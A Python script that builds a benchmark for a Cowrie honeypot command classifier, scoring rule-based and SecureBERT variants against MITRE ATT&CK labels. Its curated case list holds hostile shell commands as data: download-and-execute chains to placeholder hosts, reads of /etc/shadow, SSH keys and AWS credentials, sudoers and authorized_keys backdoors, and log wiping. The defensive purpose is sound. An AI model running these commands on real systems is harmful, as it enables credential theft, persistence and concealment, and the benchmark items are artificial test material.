"""Build a scoped, researcher/AI-assisted Cowrie command consistency benchmark.

The benchmark is representative by designed behavior-category coverage, not by
the prevalence of commands in an Internet population. Labels are conservative
observable-based review decisions and are not independent expert ground truth.
"""

from __future__ import annotations

import argparse
import json
import re
from collections import Counter
from pathlib import Path
from typing import Any, Dict, Iterable, List, Mapping, Sequence, Set, Tuple

from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.trust import (
    classification_audit_reason,
    is_trusted_classification_event,
)
from production.tools.classification_consistency_benchmark import _main_ttps, _ttp_metrics
from production.utils.serialization import utc_now


CaseSpec = Tuple[str, str, Sequence[str], str, str]


CURATED_CASES: List[CaseSpec] = [
    # Curated Cowrie-observable baseline commands.
    ("ls", "file_directory_discovery", ["T1083"], "curated_cowrie_command", "A bare ls directly enumerates directory contents."),
    ("whoami", "user_system_discovery", ["T1033"], "curated_cowrie_command", "whoami directly observes the current user."),
    ("exit", "shell_noise_random_probe", [], "curated_cowrie_command", "Shell termination is not sufficient ATT&CK behavior evidence."),
    # Common scoped honeypot commands.
    ("id", "user_system_discovery", ["T1033"], "common_honeypot_command", "id directly exposes current user and group identity."),
    ("uname -a", "user_system_discovery", ["T1082"], "common_honeypot_command", "uname observes operating-system and kernel information."),
    ("hostname", "user_system_discovery", ["T1082"], "common_honeypot_command", "hostname observes system identity information."),
    ("w", "user_system_discovery", ["T1033"], "common_honeypot_command", "w observes logged-in users."),
    ("uptime", "user_system_discovery", ["T1082"], "common_honeypot_command", "uptime exposes system runtime information."),
    ("lscpu", "user_system_discovery", ["T1082"], "common_honeypot_command", "lscpu observes processor and platform information."),
    ("ls -la /tmp", "file_directory_discovery", ["T1083"], "common_honeypot_command", "ls enumerates files and directories."),
    ("pwd", "file_directory_discovery", ["T1083"], "common_honeypot_command", "pwd observes the current directory."),
    ("find /tmp -name '*.sh'", "file_directory_discovery", ["T1083"], "common_honeypot_command", "find enumerates matching files."),
    ("cat /proc/mounts", "file_directory_discovery", ["T1083"], "common_honeypot_command", "The mount table exposes mounted filesystems."),
    ("which wget", "file_directory_discovery", ["T1083"], "common_honeypot_command", "which discovers an executable path."),
    ("df -h", "file_directory_discovery", ["T1082"], "common_honeypot_command", "df exposes filesystem capacity as system information."),
    ("ip addr", "network_discovery", ["T1016"], "common_honeypot_command", "ip addr observes network configuration."),
    ("ifconfig", "network_discovery", ["T1016"], "common_honeypot_command", "ifconfig observes network configuration."),
    ("netstat -antp", "network_discovery", ["T1049"], "common_honeypot_command", "netstat observes network connections."),
    ("ss -lntp", "network_discovery", ["T1049"], "common_honeypot_command", "ss observes listening sockets and connections."),
    ("nmap -sV 192.0.2.1", "network_discovery", ["T1046"], "common_honeypot_command", "nmap directly performs network service discovery."),
    ("ping -c 1 192.0.2.2", "network_discovery", ["T1018"], "common_honeypot_command", "A targeted ping probes a remote system."),
    ("curl -fsSL http://example.invalid/a -o /tmp/a", "downloader_tool_transfer", ["T1105"], "common_honeypot_command", "A downloader command supports attempted ingress tool transfer, not successful transfer."),
    ("wget http://example.invalid/a -O /tmp/a", "downloader_tool_transfer", ["T1105"], "common_honeypot_command", "A downloader command supports attempted ingress tool transfer, not successful transfer."),
    ("busybox wget http://example.invalid/a -O /tmp/a", "downloader_tool_transfer", ["T1105"], "common_honeypot_command", "BusyBox wget is an observable downloader command."),
    ("tftp 198.51.100.2 -c get a", "downloader_tool_transfer", ["T1105"], "common_honeypot_command", "TFTP get supports attempted ingress tool transfer."),
    ("python3 -c \"import requests;open('/tmp/a','wb').write(requests.get('http://example.invalid/a').content)\"", "downloader_tool_transfer", ["T1105", "T1059"], "common_honeypot_command", "The command uses a scripting interpreter to attempt a remote transfer."),
    ("sh /tmp/a.sh", "execution", ["T1059"], "common_honeypot_command", "An explicit shell invocation supports command execution."),
    ("bash -c 'id'", "execution", ["T1059"], "common_honeypot_command", "bash -c explicitly invokes a command interpreter."),
    ("python3 /tmp/x.py", "execution", ["T1059"], "common_honeypot_command", "An explicit Python script invocation supports execution."),
    ("nohup /tmp/a >/dev/null 2>&1 &", "execution", ["T1059"], "common_honeypot_command", "nohup explicitly launches a program; success is not confirmed."),
    ("./payload", "execution", ["T1059"], "common_honeypot_command", "A relative executable invocation supports attempted execution."),
    ("echo '* * * * * /tmp/a' | crontab -", "persistence_like", ["T1053"], "common_honeypot_command", "Writing a cron entry supports scheduled persistence-like behavior."),
    ("echo 'ssh-ed25519 AAAATEST' >> ~/.ssh/authorized_keys", "persistence_like", ["T1098"], "common_honeypot_command", "Writing an authorized key supports account manipulation."),
    ("systemctl enable test.service", "persistence_like", ["T1543"], "common_honeypot_command", "Enabling a service supports create/modify system process behavior."),
    ("echo /tmp/a >> ~/.bashrc", "persistence_like", ["T1546"], "common_honeypot_command", "Writing a shell startup file supports event-triggered execution."),
    ("useradd backdoor", "persistence_like", ["T1136"], "common_honeypot_command", "useradd directly supports account creation."),
    ("chpasswd < /tmp/passwd.txt", "persistence_like", ["T1098"], "common_honeypot_command", "chpasswd changes account credentials."),
    ("cat /etc/shadow", "credential_file_access", ["T1003"], "common_honeypot_command", "Reading the shadow file supports OS credential access evidence."),
    ("cat /root/.ssh/id_rsa", "credential_file_access", ["T1552"], "common_honeypot_command", "Reading a private SSH key supports unsecured-credential access."),
    ("grep -R password /var/www", "credential_file_access", ["T1552"], "common_honeypot_command", "Searching web files for passwords supports credential-in-files access."),
    ("cat /root/.aws/credentials", "credential_file_access", ["T1552"], "common_honeypot_command", "Reading cloud credentials supports unsecured-credential access."),
    ("find /var/www -name wp-config.php", "credential_file_access", ["T1083"], "common_honeypot_command", "The command discovers a configuration file; credential content is not yet observed."),
    ("history -c", "cleanup_defense_evasion", ["T1070"], "common_honeypot_command", "Clearing shell history supports indicator removal."),
    ("rm -f ~/.bash_history", "cleanup_defense_evasion", ["T1070"], "common_honeypot_command", "Deleting shell history supports indicator removal."),
    ("truncate -s 0 /var/log/auth.log", "cleanup_defense_evasion", ["T1070"], "common_honeypot_command", "Truncating an authentication log supports indicator removal."),
    ("shred -u /var/log/syslog", "cleanup_defense_evasion", ["T1070"], "common_honeypot_command", "Shredding a log supports indicator removal."),
    ("unset HISTFILE", "cleanup_defense_evasion", ["T1070"], "common_honeypot_command", "Disabling history recording supports indicator removal."),
    ("sudo -i", "privilege_related", ["T1548"], "common_honeypot_command", "sudo -i is an elevation-control mechanism attempt; success is not confirmed."),
    ("su root", "privilege_related", ["T1548"], "common_honeypot_command", "su is an elevation-control mechanism attempt; success is not confirmed."),
    ("chmod u+s /tmp/x", "privilege_related", ["T1548"], "common_honeypot_command", "Setting a setuid bit supports abuse of elevation-control mechanisms."),
    ("echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers", "privilege_related", ["T1548"], "common_honeypot_command", "Modifying sudoers supports an elevation mechanism; effect is not confirmed."),
    ("sh", "shell_noise_random_probe", [], "common_honeypot_command", "A bare shell token is treated as shell noise without additional behavior."),
    ("bash", "shell_noise_random_probe", [], "common_honeypot_command", "A bare shell token is treated as shell noise without additional behavior."),
    ("/bin/sh", "shell_noise_random_probe", [], "common_honeypot_command", "A bare shell token is treated as shell noise without additional behavior."),
    ("/bin/busybox OYBVI", "shell_noise_random_probe", [], "common_honeypot_command", "An opaque random BusyBox applet probe has no defensible semantic ATT&CK mapping."),
    ("ping", "unknown_unsupported", [], "common_honeypot_command", "A command name without a destination does not support a remote-system claim."),
    ("echo hello", "unknown_unsupported", [], "common_honeypot_command", "Generic output has no scoped ATT&CK meaning."),
    ("cd /tmp", "unknown_unsupported", [], "common_honeypot_command", "Changing directory alone is insufficient for a candidate ATT&CK mapping."),
    ("sleep 1", "unknown_unsupported", [], "common_honeypot_command", "A short delay alone is insufficient evidence."),
    ("kill -9 1234", "ambiguous_unsupported", [], "common_honeypot_command", "Without process identity, intent and technique are ambiguous."),
    ("whoami; uname -a; ls -la", "compound_command", ["T1033", "T1082", "T1083"], "common_honeypot_command", "Each compound fragment directly supports a discovery mapping."),
    ("curl http://example.invalid/p -o /tmp/p; chmod +x /tmp/p; /tmp/p", "compound_command", ["T1105", "T1222", "T1059"], "common_honeypot_command", "The sequence shows transfer intent, permission change, and an execution attempt; success is not confirmed."),
    ("cat /etc/shadow; history -c", "compound_command", ["T1003", "T1070"], "common_honeypot_command", "The fragments support credential-file access and history cleanup."),
    ("ip addr && netstat -antp", "compound_command", ["T1016", "T1049"], "common_honeypot_command", "The fragments observe network configuration and connections."),
    ("base64 -d /tmp/x.b64 > /tmp/x; sh /tmp/x", "compound_command", ["T1140", "T1059"], "common_honeypot_command", "The fragments support decoding and an execution attempt."),
    ("cat /proc/cpuinfo | grep model; df -h", "compound_command", ["T1082"], "common_honeypot_command", "Both fragments expose system information."),
]


def _clean(values: Iterable[Any]) -> Set[str]:
    return {str(value).strip() for value in values if str(value or "").strip() not in {"", "unknown", "T0000_UNKNOWN"}}


def _load_tactics(path: Path) -> Dict[str, List[str]]:
    document = json.loads(path.read_text(encoding="utf-8"))
    techniques = document.get("techniques") or {}
    return {
        str(ttp): [str(value).strip().lower().replace(" ", "-") for value in item.get("tactics") or []]
        for ttp, item in techniques.items()
        if isinstance(item, dict)
    }


def _captured_bert(record: Mapping[str, Any]) -> List[Dict[str, Any]]:
    predictions: List[Dict[str, Any]] = []
    seen = set()
    for output in record.get("classifier_outputs") or []:
        if not isinstance(output, dict):
            continue
        if output.get("bert_ttp"):
            ttp = str(output.get("bert_ttp"))
            confidence = float(output.get("bert_confidence") or 0.0)
        elif str(output.get("source") or "").startswith("securebert") and output.get("ttp"):
            ttp = str(output.get("ttp"))
            confidence = float(output.get("confidence") or 0.0)
        else:
            continue
        classified_command = str(output.get("command") or "")
        key = (classified_command, ttp, round(confidence, 6))
        if key not in seen:
            seen.add(key)
            predictions.append({
                "command": classified_command,
                "ttp": ttp,
                "confidence": confidence,
            })
    return predictions


def _rules(classifier: NotebookParityClassifier, command: str) -> List[Dict[str, Any]]:
    return [
        dict(item) for item in classifier.classify(command)
        if str(item.get("source") or "") in {"rule", "both"} and item.get("ttp")
    ]


def _hybrid_events(
    command: str,
    rule_events: Sequence[Dict[str, Any]],
    bert: Sequence[Dict[str, Any]],
    *,
    threshold: float,
) -> List[Dict[str, Any]]:
    if rule_events:
        return [dict(item) for item in rule_events]
    return [
        {
            "command": str(item.get("command") or command),
            "ttp": item["ttp"],
            "source": "securebert",
            "confidence": float(item["confidence"]),
            "high_confidence": True,
        }
        for item in bert
        if float(item.get("confidence") or 0.0) >= threshold
    ]


def _tactics(ttps: Iterable[str], tactic_map: Mapping[str, Sequence[str]]) -> List[str]:
    return sorted({tactic for ttp in ttps for tactic in tactic_map.get(ttp, [])})


def _judgment(expected: Set[str], predicted: Set[str], category: str) -> str:
    if category == "ambiguous_unsupported":
        return "ambiguous"
    if not expected:
        return "correct" if not predicted else "unsupported"
    if expected == predicted:
        return "correct"
    if expected & predicted:
        return "partially_correct"
    return "incorrect"


def _metric_block(rows: Sequence[Dict[str, Any]]) -> Dict[str, Any]:
    metrics = _ttp_metrics(rows)
    metrics["eligible_cases"] = len(rows)
    return metrics


def _md(value: Any) -> str:
    return str(value if value is not None else "").replace("|", "\\|").replace("\n", " ")


def build(
    review_document: Mapping[str, Any],
    queue_document: Mapping[str, Any],
    *,
    rule_policy: str,
    mitre_cache: Path,
    securebert_threshold: float = 0.55,
) -> Tuple[Dict[str, Any], Dict[str, Any]]:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=None, rule_policy_path=rule_policy)
    tactic_map = _load_tactics(mitre_cache)
    queue_by_command = {
        str(item.get("command") or ""): item
        for item in queue_document.get("review_records") or queue_document.get("cases") or []
        if isinstance(item, dict)
    }
    reviewed = [item for item in review_document.get("classification_review") or [] if isinstance(item, dict)]
    specs: List[Dict[str, Any]] = []
    seen = set()
    for item in reviewed:
        command = str(item.get("command") or "").strip()
        if not command or command in seen:
            continue
        seen.add(command)
        specs.append({
            "command": command,
            "source_category": "external_cowrie_derived_review_case",
            "behavior_category": str(item.get("queue_reason") or "externally_observed_command"),
            "expected_ttps": sorted(_clean(item.get("recommended_ttps") or [])),
            "review_reason": str(item.get("reasoning") or "Conservative observable-based review from the prior AI-assisted queue."),
        })
    for command, category, ttps, source, reason in CURATED_CASES:
        if command in seen:
            continue
        seen.add(command)
        specs.append({
            "command": command,
            "source_category": source,
            "behavior_category": category,
            "expected_ttps": sorted(_clean(ttps)),
            "review_reason": reason,
        })
    if not 100 <= len(specs) <= 150:
        raise ValueError(f"representative benchmark must contain 100-150 unique commands, got {len(specs)}")

    cases: List[Dict[str, Any]] = []
    variant_rows: Dict[str, List[Dict[str, Any]]] = {
        "rules_only": [], "securebert_only": [], "raw_hybrid": [], "trusted_hybrid": []
    }
    for index, spec in enumerate(specs, start=1):
        command = spec["command"]
        expected = set(spec["expected_ttps"])
        captured_record = queue_by_command.get(command)
        bert = _captured_bert(captured_record or {})
        rule_events = _rules(classifier, command)
        hybrid_events = _hybrid_events(command, rule_events, bert, threshold=securebert_threshold)
        trusted_events = [item for item in hybrid_events if is_trusted_classification_event(item)]
        rule_labels = _clean(item.get("ttp") for item in rule_events)
        bert_labels = _clean(item["ttp"] for item in bert if float(item.get("confidence") or 0.0) >= securebert_threshold)
        raw_labels = _clean(item.get("ttp") for item in hybrid_events)
        trusted_labels = _clean(item.get("ttp") for item in trusted_events)
        availability = {
            "rules_only": True,
            "securebert_only": captured_record is not None,
            "raw_hybrid": bool(rule_events) or captured_record is not None,
            "trusted_hybrid": bool(rule_events) or captured_record is not None,
        }
        predictions = {
            "rules_only": rule_labels,
            "securebert_only": bert_labels,
            "raw_hybrid": raw_labels,
            "trusted_hybrid": trusted_labels,
        }
        for name, labels in predictions.items():
            if availability[name]:
                variant_rows[name].append({
                    "command": command,
                    "expected_ttps": sorted(expected),
                    "predicted_ttps": sorted(labels),
                })
        judgment = _judgment(expected, trusted_labels, spec["behavior_category"])
        disposition = "audit-only" if not expected else ("trusted" if judgment == "correct" else "weak")
        final_events = trusted_events
        cases.append({
            "case_id": f"representative-{index:03d}",
            **spec,
            "expected_tactics": _tactics(expected, tactic_map),
            "system_ttp": sorted(trusted_labels),
            "system_tactic": _tactics(trusted_labels, tactic_map),
            "classification_source": sorted({str(item.get("source") or "unknown") for item in final_events}),
            "confidence_or_policy_strength": max([float(item.get("confidence") or 0.0) for item in final_events] or [0.0]),
            "trusted_audit_only_status": "trusted" if final_events else "audit-only_or_abstained",
            "review_judgment": judgment,
            "conservative_final_ttp_decision": sorted(expected),
            "conservative_final_tactic_decision": _tactics(expected, tactic_map),
            "reason": spec["review_reason"],
            "recommended_evidence_disposition": disposition,
            "variant_predictions": {name: sorted(labels) for name, labels in predictions.items()},
            "variant_evaluation_available": availability,
            "captured_securebert_predictions": bert,
            "audit_reasons": [classification_audit_reason(item) for item in hybrid_events if not is_trusted_classification_event(item)],
        })

    variants: Dict[str, Any] = {}
    for name, rows in variant_rows.items():
        exact = _metric_block(rows)
        parent_rows = [
            {**row, "expected_ttps": _main_ttps(row["expected_ttps"]), "predicted_ttps": _main_ttps(row["predicted_ttps"])}
            for row in rows
        ]
        variants[name] = {
            "exact_technique_metrics": exact,
            "parent_technique_metrics": _metric_block(parent_rows),
            "not_evaluated_cases": len(cases) - len(rows),
            "false_positive_examples": [
                row for row in rows if not row["expected_ttps"] and row["predicted_ttps"]
            ][:10],
        }
    high_confidence_unsupported = [
        {
            "case_id": case["case_id"],
            "command": case["command"],
            "expected_ttps": case["conservative_final_ttp_decision"],
            "captured_securebert_predictions": [
                item for item in case["captured_securebert_predictions"] if float(item.get("confidence") or 0.0) >= 0.90
            ],
            "trusted_hybrid_prediction": case["variant_predictions"]["trusted_hybrid"],
        }
        for case in cases
        if not case["conservative_final_ttp_decision"]
        and any(float(item.get("confidence") or 0.0) >= 0.90 for item in case["captured_securebert_predictions"])
    ]
    source_counts = Counter(case["source_category"] for case in cases)
    category_counts = Counter(case["behavior_category"] for case in cases)
    benchmark = {
        "schema_version": "representative_classification_benchmark.v1",
        "generated_at": utc_now(),
        "review_type": "researcher/AI-assisted consistency review",
        "review_method": "conservative observable-based review against MITRE ATT&CK definitions",
        "validation_status": "not independent expert validation; not expert-adjudicated or human-reviewed ground truth",
        "scope": "Cowrie honeypot-observable SSH commands only",
        "representativeness": "designed category coverage, not population-prevalence sampling",
        "selection_limitations": [
            "The external commands come from an uncertainty/review queue rather than a random full-corpus sample.",
            "The common command cases are deliberately balanced fixtures.",
            "Only three commands were available in the checked-in real production-session raw artifact.",
            "SecureBERT-only metrics use only cases with a captured SecureBERT output; missing captures are not counted as abstentions.",
        ],
        "case_count": len(cases),
        "source_counts": dict(sorted(source_counts.items())),
        "category_counts": dict(sorted(category_counts.items())),
        "cases": cases,
    }
    results = {
        "schema_version": "classification_benchmark_results.v1",
        "generated_at": utc_now(),
        "benchmark_case_count": len(cases),
        "benchmark_review_type": benchmark["review_type"],
        "validation_status": benchmark["validation_status"],
        "metric_interpretation": "consistency metrics on a designed scoped benchmark; not production accuracy",
        "securebert_threshold": securebert_threshold,
        "variants": variants,
        "high_confidence_unsupported_examples": high_confidence_unsupported,
    }
    return benchmark, results


def benchmark_markdown(benchmark: Mapping[str, Any]) -> str:
    lines = [
        "# Representative Classification Benchmark (2026-07-13)", "",
        "> Researcher/AI-assisted consistency review using conservative observable-based review against MITRE ATT&CK definitions. This is not independent expert validation or human-reviewed ground truth.", "",
        f"Cases: **{benchmark['case_count']}**. Sampling is representative by designed scoped category coverage, not command prevalence.", "",
        "## Source Composition", "", "| Source | Cases |", "|---|---:|",
    ]
    lines.extend(f"| {_md(k)} | {v} |" for k, v in benchmark["source_counts"].items())
    lines.extend(["", "## Category Composition", "", "| Category | Cases |", "|---|---:|"])
    lines.extend(f"| {_md(k)} | {v} |" for k, v in benchmark["category_counts"].items())
    lines.extend([
        "", "## Review Cases", "",
        "| ID | Command | Source | Category | System TTP | System tactic | Source/confidence | Status | Judgment | Conservative decision | Disposition | Reason |",
        "|---|---|---|---|---|---|---|---|---|---|---|---|",
    ])
    for case in benchmark["cases"]:
        source_conf = f"{','.join(case['classification_source']) or 'none'} / {case['confidence_or_policy_strength']:.4f}"
        lines.append("| " + " | ".join(_md(value) for value in (
            case["case_id"], f"`{case['command']}`", case["source_category"], case["behavior_category"],
            ", ".join(case["system_ttp"]) or "abstain", ", ".join(case["system_tactic"]) or "none",
            source_conf, case["trusted_audit_only_status"], case["review_judgment"],
            ", ".join(case["conservative_final_ttp_decision"]) or "abstain",
            case["recommended_evidence_disposition"], case["reason"],
        )) + " |")
    lines.extend(["", "## Limitations", ""])
    lines.extend(f"- {item}" for item in benchmark["selection_limitations"])
    return "\n".join(lines) + "\n"


def results_markdown(results: Mapping[str, Any]) -> str:
    lines = [
        "# Classification Benchmark Results (2026-07-13)", "",
        "> These are consistency metrics on a researcher/AI-assisted, category-balanced benchmark. They are not production accuracy and are not independent expert validation.", "",
        "## Exact-Technique Metrics", "",
        "| Variant | Eligible | Not evaluated | Micro precision | Macro precision | Recall | F1 | Exact-set accuracy | Coverage | Unknown abstention correctness |",
        "|---|---:|---:|---:|---:|---:|---:|---:|---:|---:|",
    ]
    for name, variant in results["variants"].items():
        metric = variant["exact_technique_metrics"]
        lines.append(
            f"| {name} | {metric['eligible_cases']} | {variant['not_evaluated_cases']} | "
            f"{metric['micro_precision']:.4f} | {metric['macro_precision']:.4f} | "
            f"{metric['micro_recall']:.4f} | {metric['micro_f1']:.4f} | "
            f"{metric['exact_set_accuracy']:.4f} | {metric['coverage']:.4f} | "
            f"{metric['unknown_abstention_accuracy'] if metric['unknown_abstention_accuracy'] is not None else 'N/A'} |"
        )
    lines.extend(["", "## False-Positive Examples", ""])
    any_examples = False
    for name, variant in results["variants"].items():
        for row in variant["false_positive_examples"]:
            any_examples = True
            lines.append(f"- **{name}:** `{_md(row['command'])}` -> {', '.join(row['predicted_ttps'])}")
    if not any_examples:
        lines.append("- None in the evaluated subsets.")
    lines.extend(["", "## High-Confidence Unsupported SecureBERT Examples", ""])
    if results["high_confidence_unsupported_examples"]:
        for row in results["high_confidence_unsupported_examples"]:
            preds = ", ".join(
                f"{item['ttp']} ({float(item['confidence']):.4f})"
                for item in row["captured_securebert_predictions"]
            )
            lines.append(f"- `{_md(row['command'])}` -> {preds}; trusted hybrid: {row['trusted_hybrid_prediction'] or 'abstain'}")
    else:
        lines.append("- None in this benchmark.")
    lines.extend([
        "", "## Interpretation", "",
        "- SecureBERT-only metrics exclude cases without a captured model output; those cases are reported as not evaluated, not as correct abstentions.",
        "- Coverage means a variant emitted at least one candidate label on its eligible subset.",
        "- Empty conservative labels represent an expected abstention for unsupported or audit-only commands.",
    ])
    return "\n".join(lines) + "\n"


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--review-artifact", required=True)
    parser.add_argument("--queue-artifact", required=True)
    parser.add_argument("--rule-policy", default="configs/classification_rules.trusted.json")
    parser.add_argument("--mitre-cache", default="data/feeds/mitre_attack_cache.json")
    parser.add_argument("--benchmark-json", required=True)
    parser.add_argument("--benchmark-md", required=True)
    parser.add_argument("--results-json", required=True)
    parser.add_argument("--results-md", required=True)
    args = parser.parse_args()
    review = json.loads(Path(args.review_artifact).read_text(encoding="utf-8"))
    queue = json.loads(Path(args.queue_artifact).read_text(encoding="utf-8"))
    benchmark, results = build(
        review, queue, rule_policy=args.rule_policy, mitre_cache=Path(args.mitre_cache)
    )
    outputs = {
        Path(args.benchmark_json): json.dumps(benchmark, indent=2, sort_keys=True) + "\n",
        Path(args.benchmark_md): benchmark_markdown(benchmark),
        Path(args.results_json): json.dumps(results, indent=2, sort_keys=True) + "\n",
        Path(args.results_md): results_markdown(results),
    }
    for path, content in outputs.items():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    print(json.dumps({
        "case_count": benchmark["case_count"],
        "source_counts": benchmark["source_counts"],
        "category_counts": benchmark["category_counts"],
        "metrics": {name: value["exact_technique_metrics"] for name, value in results["variants"].items()},
        "outputs": [str(path) for path in outputs],
    }, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
